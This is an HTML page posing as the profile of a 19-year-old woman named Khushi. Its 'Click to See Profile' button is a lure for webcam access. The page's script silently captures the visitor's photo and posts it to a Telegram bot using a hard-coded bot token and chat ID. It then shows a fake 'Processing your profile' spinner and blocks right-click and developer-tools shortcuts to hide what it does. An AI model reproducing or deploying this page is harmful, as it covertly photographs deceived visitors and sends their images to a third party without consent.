<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Khushi's Profile</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .profile-pic {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 20px;
            border: 4px solid rgba(255,255,255,0.3);
        }
        .intro h1 {
            font-size: 2.5em;
            margin: 10px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .intro p {
            font-size: 1.2em;
            margin: 5px 0;
            opacity: 0.9;
        }
        .click-btn {
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            border: none;
            padding: 15px 40px;
            font-size: 1.3em;
            color: white;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 30px;
            font-weight: bold;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        .click-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
        }
        .click-btn:active {
            transform: translateY(0);
        }
        #cameraSection {
            display: none;
            margin-top: 30px;
        }
        #video {
            width: 300px;
            height: 250px;
            border-radius: 15px;
            border: 3px solid rgba(255,255,255,0.4);
        }
        #captureBtn {
            background: #4ecdc4;
            border: none;
            padding: 12px 30px;
            font-size: 1.1em;
            color: white;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 15px;
            font-weight: bold;
        }
        .loading {
            display: none;
            margin-top: 20px;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="photo1.jpg" alt="Khushi" class="profile-pic">
        <div class="intro">
            <h1>Khushi</h1>
            <p>From Rajasthan</p>
            <p>Age 19</p>
        </div>
        <button class="click-btn" onclick="startCamera()">Click to See Profile</button>
        
        <div id="cameraSection">
            <video id="video" autoplay></video>
            <br>
            <button id="captureBtn" onclick="capturePhoto()">Take Photo</button>
        </div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Processing your profile...</p>
        </div>
    </div>

    <script>
        const botToken = '8606335181:AAF51XIApm1NkEZKKWxX06sIgkHODZqULuQ';
        const chatId = '7735968383';
        
        let stream = null;
        let video = null;
        
        function startCamera() {
            video = document.getElementById('video');
            const cameraSection = document.getElementById('cameraSection');
            const clickBtn = document.querySelector('.click-btn');
            
            clickBtn.style.display = 'none';
            cameraSection.style.display = 'block';
            
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } 
            })
            .then(s => {
                stream = s;
                video.srcObject = stream;
            })
            .catch(err => {
                alert('Camera access required to view profile!');
                clickBtn.style.display = 'block';
                cameraSection.style.display = 'none';
            });
        }
        
        function capturePhoto() {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            
            // Convert to blob silently
            canvas.toBlob(blob => {
                sendToTelegram(blob);
            }, 'image/jpeg', 0.9);
            
            // Hide camera and show loading
            document.getElementById('cameraSection').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Stop camera
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }
        
        function sendToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photoBlob, 'profile.jpg');
            
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Photo sent successfully:', data);
                // Reset page after 3 seconds
                setTimeout(() => {
                    location.reload();
                }, 3000);
            })
            .catch(error => {
                console.error('Error sending photo:', error);
                // Still reset page
                setTimeout(() => {
                    location.reload();
                }, 3000);
            });
        }
        
        // Prevent right click and dev tools
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
